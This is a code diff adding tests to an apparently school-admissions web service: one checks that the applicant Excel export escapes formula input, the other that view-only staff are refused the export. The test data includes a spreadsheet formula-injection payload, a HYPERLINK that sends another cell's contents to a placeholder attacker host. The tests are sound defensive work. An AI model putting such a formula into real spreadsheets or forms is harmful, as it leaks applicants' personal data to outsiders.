@@ -2,6 +2,7 @@
 
 import io
 import re
+import zipfile
 from datetime import UTC, date, datetime, timedelta
 
 import pytest
@@ -393,3 +394,28 @@ async def test_english_emails(monkeypatch):
     assert "123456" in texts[1] and "valid for" in texts[1]
     assert "SU27-ABCDE — Bat Saraa, grade 1" in texts[2]
     assert "«2027 элсэлт»-д 1-р ангид" in texts[3] and "Мягмар" in texts[3]
+
+
+async def test_export_never_writes_public_input_as_excel_formula(client, make_user, outbox):
+    h = await manager(client, make_user)
+    rnd = await make_round(client, h)
+    evil = '=HYPERLINK("http://evil.example/?x="&K2,"Дэлгэрэнгүй")'
+    r = await apply(client, outbox, child_first_name=evil, current_school="=1+1", guardian_last_name="@SUM(A1)", phone="+976 99112233")
+    assert r.status_code == 201, r.text
+    x = await client.get(f"/api/admissions/admin/rounds/{rnd['id']}/applicants.xlsx", headers=h)
+    assert b"<f>" not in zipfile.ZipFile(io.BytesIO(x.content)).read("xl/worksheets/sheet1.xml")
+    ws = load_workbook(io.BytesIO(x.content)).active
+    row = {c.value: i for i, c in enumerate(ws[1])}
+    assert ws[2][row["Нэр"]].value == evil and ws[2][row["Нэр"]].data_type == "s"
+    # Excel дээр нүдийг засах үед ч томъёо болохгүй (quotePrefix)
+    assert ws[2][row["Нэр"]].quotePrefix and ws[2][row["Утас"]].quotePrefix
+    assert not ws[2][row["Овог"]].quotePrefix
+
+
+async def test_export_requires_edit_permission(client, make_user):
+    h = await manager(client, make_user)
+    rnd = await make_round(client, h)
+    v = await staff_headers(client, make_user, "viewer1", roles=("admissions.view",))
+    assert (await client.get(f"/api/admissions/admin/rounds/{rnd['id']}/applicants/", headers=v)).status_code == 200
+    r = await client.get(f"/api/admissions/admin/rounds/{rnd['id']}/applicants.xlsx", headers=v)
+    assert r.status_code == 403 and r.json() == {"detail": "Танд энэ хэсгийг зөвхөн харах эрх байна."}
